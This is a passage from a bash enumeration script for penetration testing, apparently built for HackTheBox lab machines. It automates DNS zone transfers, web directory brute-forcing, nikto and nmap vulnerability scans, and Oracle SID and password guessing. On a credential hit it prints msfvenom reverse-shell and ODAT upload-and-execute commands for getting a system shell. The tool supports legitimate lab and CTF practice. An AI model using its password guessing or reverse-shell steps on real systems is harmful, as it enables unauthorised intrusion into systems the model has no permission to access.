                        echo -e "${MANUALCMD} wfuzz -c -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -u $htbdomain2 -H 'Host: FUZZ.$htbdomain2' " | tee -a manual-commands.txt
                        # wfuzz -c -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -u $htbdomain2 -H "Host: FUZZ.$htbdomain2" --hw 717 --hc 404 -o raw | tee wfuzz-dns-$htbdomain2.txt
                    done
                fi
                axfrdomains=$(grep "$rhost" /etc/hosts | sed -n -e $"s/^.*$rhost\t//p")
                echo -e "${DOPE} dig axfr @$rhost $axfrdomains"
                dig axfr @"$rhost" $axfrdomains | tee zonetransfer-$rhost.log
                axfrdomains2=$(echo $axfrdomains | tr '\t' '\n')
                for domain3000 in $axfrdomains2; do
                    if grep -q $domain3000 zonetransfer-$rhost.log; then
                        echo "yes" >>/tmp/yes.log
                    else
                        :
                    fi
                    if grep -q "yes" /tmp/yes.log; then
                        grep -v ";" zonetransfer-$rhost.log | grep -v -e '^[[:space:]]*$' >filtered-zone-transfer-$rhost.log
                        allDomains2=$(cat filtered-zone-transfer-$rhost.log | awk '{print $1}' | sort -u)
                        allDomains3=$(cat filtered-zone-transfer-$rhost.log | sed -n -e 's/^.*SOA\t//p' | tr ' ' '\n' | grep ".htb" | sort -u)
                        for dmain2 in $allDomains2; do
                            domainDot2=$(echo $domain3000".")
                            if [[ $domainDot2 == "$dmain2" ]]; then
                                :
                            else
                                dmainMinusDot2=$(echo "${dmain2:0:-1}")
                                if grep -q "$dmainMinusDot2" /etc/hosts; then
                                    :
                                elif [[ $rhost == 127.0.0.1 ]]; then
                                    :
                                else
                                    sed -i $"/$rhost/ s/$/\t$dmainMinusDot2/" /etc/hosts
                                fi
                            fi
                        done
                        if [[ -n $allDomains3 ]]; then
                            for dmain3 in $allDomains3; do
                                domainDot3=$(echo $domain3000".")
                                if [[ $domainDot3 == "$dmain3" ]]; then
                                    :
                                else
                                    dmainMinusDot3=$(echo "${dmain3:0:-1}")
                                    if grep -q "$dmainMinusDot3" /etc/hosts; then
                                        :
                                    elif [[ $rhost == 127.0.0.1 ]]; then
                                        :
                                    else
                                        sed -i $"/$rhost/ s/$/\t$dmainMinusDot3/" /etc/hosts
                                    fi
                                fi
                            done
                        fi
                        grep $rhost /etc/hosts | sed -n -e $"s/^.*$rhost\t//p" | tr '\t' '\n' >>htbdomainslist.txt

                    fi
                done
            fi
            if [[ -s htbdomainslist.txt ]]; then
                urldomains=$(cat htbdomainslist.txt)
                for urldomain in $urldomains; do
                    echo "http://$urldomain" >>aquaurls.txt
                    echo "https://$urldomain" >>aquaurls.txt
                done
            fi
            if [[ -s aquaurls.txt ]]; then
                cat aquaurls.txt | sort -u | aquatone -out dns_aquatone_htb -screenshot-timeout 40000
            fi
        done
        if [[ -s htbdomainslist.txt ]]; then
            loophtbdomainslist2=$(cat htbdomainslist.txt | sort -u)
            for dnsname5 in $loophtbdomainslist2; do
                echo -e "${MANUALCMD} Creating Manual DNS Enum Bash Script for $dnsname5"
                cat >enum-$dnsname5.sh <<EOF
#!/bin/bash

echo -e "${DOPE} whatweb -v -a 3 http://$dnsname5 | tee whatweb-color-$dnsname5.log"
whatweb -v -a 3 http://$dnsname5 | tee whatweb-color-$dnsname5.log
sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$dnsname5.log >whatweb-ssl-$dnsname5.log && rm whatweb-color-$dnsname5.log
curl -sSik http://$dnsname5/robots.txt -m 10 -o robots-$dnsname5.txt &>/dev/null
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$dnsname5 -t 80 -e php,asp,aspx,txt,html -f -x 403 --plain-text-report SSL-dirsearch-$dnsname5.log"
python3 /opt/dirsearch/dirsearch.py -u http://$dnsname5 -t 80 -e php,asp,aspx,txt -f -x 403 --plain-text-report SSL-dirsearch-$dnsname5.log
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u http://$dnsname5 -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname5.log"
python3 /opt/dirsearch/dirsearch.py -u http://$dnsname5 -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname5.log
echo -e "${DOPE} Running nikto as a background process to speed things up"
echo -e "${DOPE} nikto -ask=no -host http://$dnsname5 >niktoscan-$dnsname5.txt 2>&1 &"
nikto -ask=no -host http://$dnsname5 -ssl >niktoscan-$dnsname5.txt 2>&1 &
echo -e "${DOPE} gobuster dns -d $dnsname5 -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -t 80 -o gobust-$dnsname5.log"
gobuster dns -d $dnsname5 -w /usr/share/seclists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt -t 80 -o gobust-$dnsname5.log
EOF
                chmod +x enum-$dnsname5.sh

            done

        fi
    fi
    if [[ -s openportsSSL-$rhost.txt ]]; then
        portfilenameSSL2=openportsSSL-$rhost.txt
        httpPortsLinesSSL2=$(cat $portfilenameSSL2)
        cwd=$(pwd)
        for sslport in $httpPortsLinesSSL2; do
            #ToDo Check all pages from dirsearch for .htb domain
            # curl -sSik https://$rhost:$sslport -m 10 -o homepage-source-$sslport.html &>/dev/null
            echo -e "${DOPE} Checking for Client Cert "
            echo -e "${DOPE} openssl s_client -connect $rhost:$sslport >opensslClient-$rhost-$sslport.log 2>/dev/null"
            printf "\n" | openssl s_client -connect $rhost:$sslport >opensslClient-$rhost-$sslport.log 2>/dev/null
            if [[ -s opensslClient-$rhost-$sslport.log ]]; then
                sed -n -e 's/^.*CN = //p' opensslClient-$rhost-$sslport.log >/tmp/CN_INFO_$sslport.log
                sed -n -e 's/^.*= //p' /tmp/CN_INFO_$sslport.log >emails_$sslport.txt
                cat /tmp/CN_INFO_$sslport.log | awk '{print $1}' | sort -u >/tmp/possibleHtbDomain-$sslport.txt
                if [[ -s /tmp/possibleHtbDomain-$sslport.txt ]]; then
                    possibleHtbDomain=$(cat /tmp/possibleHtbDomain-$sslport.txt | grep -i ".htb")
                    for line in $possibleHtbDomain; do
                        getPossibleHtbDomain=$(echo $line)
                        removeComma=$(echo "${getPossibleHtbDomain::-1}")
                        echo $removeComma >>/tmp/HTB_DOMAIN-$rhost.txt
                    done
                fi
            fi
        done
        if [[ -s /tmp/HTB_DOMAIN-$rhost.txt ]]; then
            if grep -q "www." /tmp/HTB_DOMAIN-$rhost.txt; then
                sed -n -e "s/^.*www.//p" /tmp/HTB_DOMAIN-$rhost.txt >>/tmp/HTB_DOMAIN2-$rhost.txt
                cat /tmp/HTB_DOMAIN2-$rhost.txt >>/tmp/HTB_DOMAIN-$rhost.txt
                cat /tmp/HTB_DOMAIN-$rhost.txt | sort -u >/tmp/sortedHTBDOMAINS-$rhost.txt
            else
                cat /tmp/HTB_DOMAIN-$rhost.txt | sort -u >/tmp/sortedHTBDOMAINS-$rhost.txt
            fi
        fi
        if [[ -s /tmp/sortedHTBDOMAINS-$rhost.txt ]]; then
            sorthtbdomainsfileloop=$(cat /tmp/sortedHTBDOMAINS-$rhost.txt)
            for dns in $sorthtbdomainsfileloop; do
                if grep -q $rhost /etc/hosts; then
                    if grep -q $dns /etc/hosts; then
                        :
                    else
                        echo -e "adding $dns to hosts file"
                        sed -i $"/$rhost/ s/$/\t$dns/" /etc/hosts
                    fi
                else
                    echo -e "${DOPE} Adding $dns to /etc/hosts file"
                    sed -i $"3i$rhost\t$dns" /etc/hosts
                fi
                if [[ $(grep "domain" top-open-services.txt) ]] || [[ $(grep -w "53" top-open-ports.txt) ]]; then
                    if [[ $dns == *"www."* ]]; then
                        noWwwDomain2=$(sed -n -e 's/^.*www.//p' /tmp/sortedHTBDOMAINS-$rhost.txt | head -n 1)
                        echo -e "${DOPE} host -l $noWwwDomain2 $dns"
                        host -l $noWwwDomain2 $dns | tee -a hostlookup-$rhost-$noWwwDomain2.log
                        if [[ -s fierce-$rhost-$noWwwDomain2.log ]]; then
                            :
                        else
                            echo -e "${DOPE} fierce.py --domain $noWwwDomain2 --dns-servers $rhost"
                            fierce.py --domain $noWwwDomain2 --dns-servers $rhost | tee fierce-$rhost-$noWwwDomain2.log
                        fi
                    else
                        if [[ -s fierce-$rhost-$noWwwDomain2.log ]]; then
                            :
                        else
                            baseDomain2=$(cat /tmp/sortedHTBDOMAINS-$rhost.txt | sed 's/.*\.\(.*\..*\)/\1/' | sort -u)
                            if [[ -n $baseDomain2 ]]; then
                                for uniqBaseDomain2 in $baseDomain2; do
                                    if [[ -s fierce-$rhost-$uniqBaseDomain2.log ]]; then
                                        :
                                    else
                                        echo -e "${DOPE} fierce.py --domain $uniqBaseDomain2 --dns-servers $rhost"
                                        fierce.py --domain $uniqBaseDomain2 --dns-servers $rhost | tee fierce-$rhost-$uniqBaseDomain2.log
                                    fi
                                done
                            fi
                        fi
                    fi
                fi
                echo -e "${MANUALCMD} Manual Command to Run:"
                echo -e "${MANUALCMD} wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u $dns -H 'Host: FUZZ.$dns' "
            done
            axfrdomains=$(grep "$rhost" /etc/hosts | sed -n -e $"s/^.*$rhost\t//p")
            echo -e "${DOPE} dig axfr @$rhost $axfrdomains"
            dig axfr @"$rhost" $axfrdomains | tee ssl-htb-zone-transfer-$rhost.log
        fi
        if [[ -s /tmp/sortedHTBDOMAINS-$rhost.txt ]]; then
            loophtbdomainslist=$(cat /tmp/sortedHTBDOMAINS-$rhost.txt)
            for dnsname4 in $loophtbdomainslist; do
                echo -e "${MANUALCMD} Creating Manual DNS Enum Bash Script for SSL $dnsname4"
                cat >enum-SSL-$dnsname4.sh <<EOF
#!/bin/bash

echo -e "${DOPE} whatweb -v -a 3 https://$dnsname4 | tee whatweb-color-$dnsname4.log"
whatweb -v -a 3 https://$dnsname4 | tee whatweb-color-$dnsname4.log
sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" whatweb-color-$dnsname4.log >whatweb-ssl-$dnsname4.log && rm whatweb-color-$dnsname4.log
curl -sSik https://$dnsname4/robots.txt -m 10 -o robots-$dnsname4.txt &>/dev/null
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$dnsname4 -t 80 -e php,asp,aspx,txt,html -f -x 403 --plain-text-report SSL-dirsearch-$dnsname4.log"
python3 /opt/dirsearch/dirsearch.py -u https://$dnsname4 -t 80 -e php,asp,aspx,txt -f -x 403 --plain-text-report SSL-dirsearch-$dnsname4.log
echo -e "${DOPE} python3 /opt/dirsearch/dirsearch.py -u https://$dnsname4 -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname4.log"
python3 /opt/dirsearch/dirsearch.py -u https://$dnsname4 -t 80 -e php,asp,aspx,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x 403 --plain-text-report SSL-dirsearch-dlistsmall-$dnsname4.log
echo -e "${DOPE} Running nikto as a background process to speed things up"
echo -e "${DOPE} nikto -ask=no -host https://$dnsname4 -ssl >niktoscan-$dnsname4.txt 2>&1 &"
nikto -ask=no -host https://$dnsname4 -ssl >niktoscan-$dnsname4.txt 2>&1 &
echo -e "${DOPE} gobuster dns -d $dnsname4 -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -t 80 -o gobust-$dnsname4.log"
gobuster dns -d $dnsname4 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 80 -o gobust-$dnsname4.log
EOF
                chmod +x enum-SSL-$dnsname4.sh

            done

        fi
    fi

}

screenshotWEB() {
    cwd=$(pwd)
    if [[ $(grep -E 'http|BaseHTTPServer' top-open-services.txt | grep -v "proxy") ]]; then
        if [[ -s openports-web-$rhost.txt ]]; then
            cat dirsearch* | grep -v "400" | awk '{print $3}' | sort -u >screenshot-URLS.txt
            if [[ -s screenshot-URLS.txt ]]; then
                urlPorts=$(cat openports-web-$rhost.txt | tr '\n' ',')
                formattedUrlPorts=$(echo "${urlPorts::-1}")
                cat screenshot-URLS.txt | aquatone -ports $formattedUrlPorts -out WEBSCREENSHOTS -screenshot-timeout 40000
                rm screenshot-URLS.txt
            fi
        fi
    fi
}

screenshotWEBSSL() {
    cwd=$(pwd)
    if [[ $(grep -E 'ssl/http|ssl/unknown|https' top-open-services.txt | grep -v "proxy") ]]; then
        if [[ -s openportsSSL-$rhost.txt ]]; then
            cat SSL-dirsearch* | grep -v "400" | awk '{print $3}' | sort -u >screenshot-SSL-URLS.txt
            if [[ -s screenshot-SSL-URLS.txt ]]; then
                urlSSLPorts=$(cat openportsSSL-$rhost.txt | tr '\n' ',')
                formattedSSLUrlPorts=$(echo "${urlSSLPorts::-1}")
                cat screenshot-SSL-URLS.txt | aquatone -ports $formattedSSLUrlPorts -out WEBSSLSCREENSHOTS -screenshot-timeout 40000
                rm screenshot-SSL-URLS.txt
            fi
        fi
    fi
}

openInFireFox() {
    if type -p firefox >/dev/null; then
        if [[ -s WEBSCREENSHOTS/aquatone_report.html ]]; then
            firefox WEBSCREENSHOTS/aquatone_report.html
        fi
        if [[ -s WEBSSLSCREENSHOTS/aquatone_report.html ]]; then
            firefox WEBSSLSCREENSHOTS/aquatone_report.html
        fi
        if [[ -s dns_aquatone/aquatone_report.html ]]; then
            firefox dns_aquatone/aquatone_report.html
        fi
        if [[ -s proxy_aquatone/aquatone_report.html ]]; then
            firefox proxy_aquatone/aquatone_report.html
        fi
        if [[ -s dns_aquatone_htb/aquatone_report.html ]]; then
            firefox aquatone_htb/aquatone_report.html
        fi
    else
        :
    fi
}

vulnscan() {
    grep -v "filtered" nmap/full-tcp-scan-$rhost.nmap | grep "open" | grep -i "/tcp" | cut -d "/" -f 1 >allopenports2-$rhost.txt
    # grep -i "/tcp" nmap/full-tcp-scan-$rhost.nmap | grep -w "ssh" | cut -d "/" -f 1 >sshports-$rhost.txt
    if [[ -s allopenports2-$rhost.txt ]]; then
        echo -e "${DOPE} Running nmap VulnScan!"
        echo -e "${DOPE} nmap -v -sV -Pn --script nmap-vulners -p $(tr '\n' , <allopenports2-$rhost.txt) -oA nmap/vulnscan-$rhost $rhost"
        nmap -v -sV -Pn --script nmap-vulners -p $(tr '\n' , <allopenports2-$rhost.txt) -oA nmap/vulnscan-$rhost $rhost

    fi
}

Enum_Oracle() {
    cwd=$(pwd)
    cd $cwd
    reconDir2=$(echo $cwd)
    if grep -q "1521" allopenports2-$rhost.txt; then
        echo -e "${DOPE} Found Oracle! Running NMAP Enumeration "
        echo -e "${DOPE} nmap -sV -p 1521 --script oracle-enum-users.nse,oracle-sid-brute.nse,oracle-tns-version.nse -oA nmap/oracle-$rhost $rhost"
        nmap -sV -p 1521 --script oracle-enum-users.nse,oracle-sid-brute.nse,oracle-tns-version.nse -oA nmap/oracle-$rhost $rhost
        echo -e "${DOPE} tnscmd10g ping -h $rhost -p 1521 | tee oracle-$rhost.log"
        tnscmd10g ping -h $rhost -p 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} tnscmd10g version -h $rhost -p 1521 | tee oracle-$rhost.log"
        tnscmd10g version -h $rhost -p 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} oscanner -v -s $rhost -P 1521 | tee oracle-$rhost.log"
        oscanner -v -s $rhost -P 1521 | tee oracle-$rhost.log
        echo -e "${DOPE} Running ODAT Enumeration"
        cd /opt/odat
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --ping | tee $reconDir2/oracle-ping.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --ping | tee $reconDir2/oracle-ping.txt
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --version | tee $reconDir2/oracle-version.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --version | tee $reconDir2/oracle-version.txt
        echo -e "${DOPE} ./odat.py tnscmd -s $rhost -p 1521 --status | tee $reconDir2/oracle-status.txt"
        ./odat.py tnscmd -s $rhost -p 1521 --status | tee $reconDir2/oracle-status.txt
        echo -e "${DOPE} ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt"
        ./odat.py sidguesser -s $rhost -p 1521 | tee $reconDir2/oracle-sid.txt
        SIDS=$(sed -n -e 's/^.*server: //p' $reconDir2/oracle-sid.txt)
        sid_list=$(echo $SIDS | tr "," "\n")
        cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt $reconDir2/oracle_default_userpass.txt
        cp /opt/odat/accounts/accounts_multiple.txt $reconDir2/accounts_multiple.txt
        sed 's/ /\//g' $reconDir2/oracle_default_userpass.txt -i
        sed -e 's/\(.*\)/\L\1/' $reconDir2/accounts_multiple.txt >$reconDir2/accounts_multiple_lowercase.txt
        rm $reconDir2/accounts_multiple.txt
        if [[ -n $SIDS ]]; then
            for sid in $sid_list; do
                echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt"
                ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/oracle_default_userpass.txt --force-retry | tee $reconDir2/oracle-$sid-password-guesser.txt
                if grep -i "Valid credentials found" $reconDir2/oracle-$sid-password-guesser.txt 2>/dev/null; then
                    echo -e "${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} Found Valid Credentials! ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE} ${DOPE}"
                    cp $reconDir2/oracle-$sid-password-guesser.txt $reconDir2/Found-Oracle-$sid-Credentials.txt
                    grep -v "Time" $reconDir2/Found-Oracle-$sid-Credentials.txt >$reconDir2/oracle-Found-Credentials.txt
                    rm $reconDir2/Found-Oracle-$sid-Credentials.txt
                    grep -A 1 "Accounts found" $reconDir2/oracle-Found-Credentials.txt | tail -n 1 >oracle-user-pass.txt
                    username=$(cat oracle-user-pass.txt | cut -d "/" -f 1)
                    password=$(cat oracle-user-pass.txt | cut -d "/" -f 2)
                    echo -e "${DOPE} You can now get a system shell using MSFVENOM & ODAT!"
                    echo -e "${DOPE} Run the following commands"
                    echo -e "${DOPE} msfvenom -p windows/x64/shell/reverse_tcp LHOST=YOUR-IP LPORT=443 -f exe -o reverse443.exe"
                    echo -e "${DOPE} Start up a metasploit multi handler listener"
                    echo -e "${DOPE} ./odat.py utlfile -s $rhost --sysdba -d $sid -U $username -P $password --putFile /temp Shell.exe reverse443.exe"
                    echo -e "${DOPE} ./odat.py externaltable -s $rhost -U $username -P $password -d $sid --sysdba --exec /temp Shell.exe"
                    :
                else
                    echo -e "${DOPE} Running ODAT passwordguesser ${DOPE} ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt"
                    ./odat.py passwordguesser -s $rhost -p 1521 -d $sid --accounts-file $reconDir2/accounts_multiple_lowercase.txt --force-retry | tee $reconDir2/oracle-$sid-2-password-guesser.txt
                fi
                grep -v "Time" $reconDir2/oracle-sid.txt >$reconDir2/oracle-SID.txt
                rm $reconDir2/oracle-sid.txt
                if [[ -s $reconDir2/oracle-$sid-2-password-guesser.txt ]]; then
                    grep -v "Time" $reconDir2/oracle-$sid-2-password-guesser.txt >$reconDir2/oracle-$sid-1-password-guesser.txt
                    rm $reconDir2/oracle-$sid-2-password-guesser.txt
                fi
                if [[ -s $reconDir2/oracle-$sid-password-guesser.txt ]]; then
                    grep -v "Time" $reconDir2/oracle-$sid-password-guesser.txt >$reconDir2/oracle-$sid-password-guesser3.txt
                    rm $reconDir2/oracle-$sid-password-guesser.txt
                fi
            done
        fi
        cd - &>/dev/null
    else
        :
    fi
}

Clean_Up() {
    # sleep 1
    cwd=$(pwd)
    cd $cwd
    rm udp-scan-$rhost.txt 2>/dev/null
    rm openports-nfs.txt 2>/dev/null
    rm domains.txt.bak 2>/dev/null
    rm openportsFTP-$rhost.txt 2>/dev/null
    rm openportsSSL-$rhost.txt 2>/dev/null
    rm openportsSMTP-$rhost.txt 2>/dev/null
    rm htbdomainslist.txt 2>/dev/null
    rm openports-web-$rhost.txt 2>/dev/null
    rm allopenports2-$rhost.txt 2>/dev/null
    find $cwd/ -maxdepth 1 -name '*-list.*' -exec mv {} $cwd/wordlists \;
    if [ -d $rhost-report ]; then
        find $cwd/ -maxdepth 1 -type d -name "WEB" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordlists" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "oracle_default_userpass.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "accounts_multiple_lowercase.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "oracle*.*" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.html" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "wafw00f*.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'dirsearch*.*' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'whatweb*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'snmpenum*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wpscan*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'wordpress*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'wp-users.txt' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "sslscan-$rhost-$port.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "domain*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "etc-hosts-backup2.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "smb-scan-$rhost.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "gobuster*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "nikto*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "robots*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "urls.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "links.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "homepage-source.html" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gowitness.db" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "aquaurls*.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "emails*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "dns_aquatone*" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "enum-*.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "wpBrute.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordpressBrute.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "manual-commands.txt" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSCREENSHOTS" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSSLSCREENSHOTS" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "eyewitness-report-*" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/$rhost-report/ -type f -size 0 -exec rm -f {} \;
        find $cwd/ -type f -size 0 -exec rm -f {} \;
    else
        mkdir -p $rhost-report
        find $cwd/ -maxdepth 1 -type d -name "WEB" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordlists" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "oracle_default_userpass.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "accounts_multiple_lowercase.txt" -exec mv {} $cwd/$rhost-report/wordlists/ \;
        find $cwd/ -maxdepth 1 -name "oracle*.*" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*.html" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "wafw00f*.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'dirsearch*.*' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'whatweb*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'snmpenum*.log' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name 'wpscan*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'wordpress*.log' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'wp-users.txt' -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name 'top-*.txt' -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "sslscan-$rhost-$port.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "domain*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "etc-hosts-backup2.txt" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "smb-scan-$rhost.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "*$rhost*.log" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "gobuster*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "nikto*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "robots*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "urls.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "links.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "homepage-source.html" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -name "*.log" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "gowitness.db" -exec mv {} $cwd/$rhost-report/ \;
        find $cwd/ -maxdepth 1 -name "aquaurls*.txt" -exec rm -f {} \;
        find $cwd/ -maxdepth 1 -name "emails*.txt" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "dns_aquatone*" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "enum-*.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "wpBrute.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "wordpressBrute.sh" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "manual-commands.txt" -exec mv {} $cwd/manual-commands/ \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSCREENSHOTS" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "WEBSSLSCREENSHOTS" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/ -maxdepth 1 -type d -name "eyewitness-report-*" -exec mv {} $cwd/$rhost-report/WEB \;
        find $cwd/$rhost-report/ -type f -size 0 -exec rm -f {} \;
        find $cwd/ -type f -size 0 -exec rm -f {} \;
    fi

}

show_Version() {
    cat <<"EOF"
@@@  @@@  @@@@@@@@  @@@@@@@    @@@@@@   @@@   @@@@@@   @@@  @@@
@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@   @@@  @@@@@@@@  @@@@ @@@
@@!  @@@  @@!       @@!  @@@  !@@       @@!  @@!  @@@  @@!@!@@@
!@!  @!@  !@!       !@!  @!@  !@!       !@!  !@!  @!@  !@!!@!@!
@!@  !@!  @!!!:!    @!@!!@!   !!@@!!    !!@  @!@  !@!  @!@ !!@!
!@!  !!!  !!!!!:    !!@!@!     !!@!!!   !!!  !@!  !!!  !@!  !!!
:!:  !!:  !!:       !!: :!!        !:!  !!:  !!:  !!!  !!:  !!!
